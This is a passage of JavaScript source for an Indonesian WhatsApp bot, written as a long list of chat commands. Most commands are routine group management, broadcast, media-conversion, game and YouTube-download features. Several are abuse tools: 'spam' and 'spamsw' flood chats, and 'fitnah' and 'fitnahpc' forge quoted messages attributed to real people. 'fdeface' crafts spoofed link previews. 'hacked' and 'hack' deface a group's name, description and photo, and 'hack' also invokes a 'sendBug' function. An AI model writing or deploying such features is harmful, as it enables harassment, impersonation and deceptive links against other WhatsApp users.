    contentText: 'OPEN/CLOSE\n\nGroup',
    footerText: 'Silahkan Pilih Saah Satu',
    buttons: buttonss,
    headerType: 1
}
await Fan.sendMessage(from, bMess, MessageType.buttonsMessage, {quoted: ftrol})
break
					case 'opengc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
                   reply(`Sukses membuka grup ${groupName}`)
						Fan.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
						reply(`Sukses menutup grup ${groupName}`)
						Fan.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Fan.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Fan.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Fan.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
            
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(`Khusus Admin Om`)
              if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
					Fan.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Sukses mengganti nama grup ke ${body.slice(11)}`)
					break					
				case 'setdeskgc':
				case 'setdescgc':
            
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                   if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
					Fan.groupUpdateDescription(from, `${body.slice(10)}`)
					reply(`Sukses mengganti deskripsi grup ke ${body.slice(10)}`)
					break
					case 'setppgrup':
					case 'setppgc':
              if (!isGroupAdmins) return reply(`Khusus Admin Om`)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
              let media = await Fan.downloadMediaMessage(encmedia)
              Fan.updateProfilePicture(from, media)
              reply(`Sukses Mengganti Profil Group`)
}
              break
				case 'setprofile':
				case 'setpp':
				Fan.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await Fan.downloadAndSaveMediaMessage(enmediau)
					await Fan.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
					
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				Fan.updatePresence(from, Presence.composing)
				Fan.groupLeave(from)
						break
				case 'bc':
					Fan.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
					if (args.length < 1) return reply('Teksnya?')
					anu = await Fan.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const totalChat = await Fan.chats.all()
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Fan.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast Ke ${totalChat.length} Chat Teks : ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Fan.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast Ke ${totalChat.length} Chat Teks : ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Fan.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast Ke ${totalChat.length} Chat Teks : ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							//sendMess(_.jid, `${body.slice(4)}`)
buttons = [{buttonId: `menu`, buttonText: {displayText: 'MENU'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'OWNER'}, type: 1}]
const btnbc = {
    contentText: `${body.slice(4)}`,
    footerText: '*_Xavhier Botzゑ_*',
    buttons: buttons,
    headerType: 1
}
await Fan.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Fan.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    Fan.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    Fan.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`Xavhier ゑ`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedSticker) return reply('reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						Fan.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedAudio) return reply('reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						Fan.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedAudio) return reply('reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						Fan.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                    var konti = body.slice(11)
                    reply(`Bentar Nyett....`)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await Fan.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    Fan.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                    var konti = body.slice(7)
                    reply(`Bentar Nyett....`)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Fan.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    Fan.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                    var teksyy = body.slice(11)
                    reply(`Bentar Nyett....`)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Fan.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    Fan.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				return Fan.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'tomp4':
					case 'togif':
            
					if (!isQuotedSticker) return reply('reply stiker nya')
                                        reply(`Bentar Nyett....`)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await Fan.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
            
					Fan.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('reply Video Nya Kak')
					reply(`Bentar Nyett....`)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await Fan.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						Fan.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
            
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
		    case 'slot':
            case 'slots':
            
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            Fan.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
            
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
            
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				
				case 'getdeskgc':
            
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await Fan.groupMetadata(anu)
				Fan.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
            
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await Fan.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                    case 'getname':
            
        var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = Fan.contacts[ambl] != undefined ? Fan.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : Fan.contacts[ambl].notify || Fan.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
     
					if (!isGroup) return reply(mess.only.group)
				if (mek.message.extendedTextMessage != undefined){
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await Fan.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await getBuffer(pic)
					Fan.sendMessage(from, thumb, MessageType.image)
				}
				break
				case 'chat':
            
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            Fan.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
				case 'ttp4':  
				case 'ttp2':  
				case 'ttp3':  
				case 'ttp':  
				case 'attp':
            
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp Xavhier ゑ`)
					atetepe = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${encodeURIComponent(c)}`)
					Fan.sendMessage(from, atetepe, sticker, { quoted: mek })
					break             
				case 'semoji':
            
			if (args === 0) return reply('emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('gagal'))
           })
    	   break
				case 'tag':
            
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					Fan.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
            
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					Fan.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join':
			reply(`PUNYA TANGAN KAN MANUAL LAH KONTOLLLL`)
              break
				case 'totag':
            
			if (!isGroup) return reply(mess.only.group)
			 if (!isOwner)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Fan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Fan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Fan.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Fan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Fan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Fan.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Fan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Fan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Fan.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Fan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Fan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Fan.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Fan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Fan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Fan.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Fan.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Fan.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Fan.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break

				case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				Fan.updatePresence(from, Presence.composing)
					anu = await Fan.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Fan.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Fan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Fan.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
					case 'fdeface':
            
var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                mediad = await Fan.downloadAndSaveMediaMessage(encmediad)
                                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                                Fan.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break
                                break
					case 'online':
            if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
				offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
				reply('Fitur OFFLINE diaktifkan')
				break
           case 'fitnahpc':
            
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    Fan.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
					case 'tagall':
                       if (!isGroupAdmins) return reply(`Khusus Admin Om`)
                        members_id = []
                        teks = (args.length > 1) ? body.slice(8).trim() : '*Info :*'
                        teks += '\n\n'
                        for (let mem of groupMembers) {
                           teks += `╠➥ @${mem.jid.split('@')[0]}\n`
                           members_id.push(mem.jid)
                        }
                        reply(teks)
                        break
            case 'hidetag':
            case 'h':
          if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
            ht = body.slice(9)
                members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
                mentions(ht, members_id, false)
                break
            case 'fitnah':
            
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: cs[1]
							}
						}
					}
				}
				Fan.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
            
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(`Khusus Admin Om`)
              if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   Fan.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                Fan.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                Fan.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                Fan.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
					case 'hack':
					if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(`Khusus Admin Om`)
              if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
              sendBug(from)
              Fan.groupUpdateSubject(from, `HACKED BY Xavhier ゑ`)
                Fan.groupUpdateDescription(from, `_${me.jid}_`)
             Fan.updateProfilePicture(from, fs.readFileSync('./P3/image/logonya.jpeg'))
                Fan.sendMessage(from, 'Succes!', text, {quoted: mek})
                await sleep(3000)
                Fan.groupLeave(from)
					break
					
						case 'ytmp4':
                if(isGroup)return reply(`Di Chat Pribadi Aja Om`)
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							reply(`Bentar Nyett....`)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdreply:{title:title,body:" YTMP4",mediaType:"2",thumbnail:getBuffer(thumb),sourceUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytsearch':
            
            if (!args.length) return reply('Judulnya apa kak?')
            try {
            	reply(`Bentar Nyett....`)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `* YOUTUBE SEARCH*
* Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
* Judul:* ${items[i].title}
* Id:* ${items[i].id}
* Ditonton:* ${items[i].views}
* Durasi:* ${items[i].duration}
* Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await Fan.sendMessage(from, thumb, image, {quoted: ftrol, caption: `${hehe}───────────────\n
* DOWNLOAD*
 ${prefix}ytmp3 [link yt] = Audio
 ${prefix}ytmp4 [link yt] = Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdreply:{title:`SEARCH: ${args[0]}`,body:"YOUTUBE SEARCH",mediaType:"2",thumbnail:pporigi,mediaUrl:`https://youtu.be/JN_Gw2GzuqQ`}}})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
					case 'ytmp3':
                if(isGroup)return reply(`Di Chat Pribadi Aja Om`)
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
						let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks) return reply(mess.error.Iv)
						try {
							reply(`Bentar Nyett....`)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
